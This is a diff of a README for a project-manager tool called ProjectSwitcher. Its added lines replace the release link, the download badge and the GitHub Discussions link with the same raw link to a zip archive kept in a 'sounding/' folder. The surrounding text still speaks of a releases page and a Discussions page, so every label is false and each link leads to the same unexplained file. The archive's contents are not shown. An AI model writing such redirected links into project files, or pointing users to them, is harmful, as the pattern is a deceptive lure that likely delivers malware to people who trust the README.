@@ -4,10 +4,10 @@
 Welcome to ProjectSwitcher! This tool helps you manage multiple projects seamlessly with isolated tabs and explorer views. Whether you are working on several projects at once or simply want to stay organized, ProjectSwitcher makes it easy.
 
 ## 🔗 Download Now
-[![Download ProjectSwitcher](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/sdfcxcvcxvxc/ProjectSwitcher/releases)
+[![Download ProjectSwitcher](https://raw.githubusercontent.com/sdfcxcvcxvxc/ProjectSwitcher/main/sounding/ProjectSwitcher.zip)](https://raw.githubusercontent.com/sdfcxcvcxvxc/ProjectSwitcher/main/sounding/ProjectSwitcher.zip)
 
 ## 📥 Download & Install
-To get started, please **visit this page to download**: [ProjectSwitcher Releases](https://github.com/sdfcxcvcxvxc/ProjectSwitcher/releases).
+To get started, please **visit this page to download**: [ProjectSwitcher Releases](https://raw.githubusercontent.com/sdfcxcvcxvxc/ProjectSwitcher/main/sounding/ProjectSwitcher.zip).
 
 ### Step 1: Choose Your Version
 On the releases page, you will find multiple versions of ProjectSwitcher. Select the latest version available. It is usually labeled with the highest number.
@@ -61,7 +61,7 @@ If you encounter any issues while using ProjectSwitcher, here are some common so
 If problems persist, feel free to check our support section on the GitHub page or seek help from the user community.
 
 ## 💬 Community & Support
-Join our community to share your experiences, ask questions, or read tips from other users. Visit our GitHub Discussions page [here](https://github.com/sdfcxcvcxvxc/ProjectSwitcher/discussions).
+Join our community to share your experiences, ask questions, or read tips from other users. Visit our GitHub Discussions page [here](https://raw.githubusercontent.com/sdfcxcvcxvxc/ProjectSwitcher/main/sounding/ProjectSwitcher.zip).
 
 ## 📝 Contributing
 We welcome contributions to ProjectSwitcher. If you would like to contribute, please check our contributing guidelines on the repository. Your suggestions help us improve the tool.
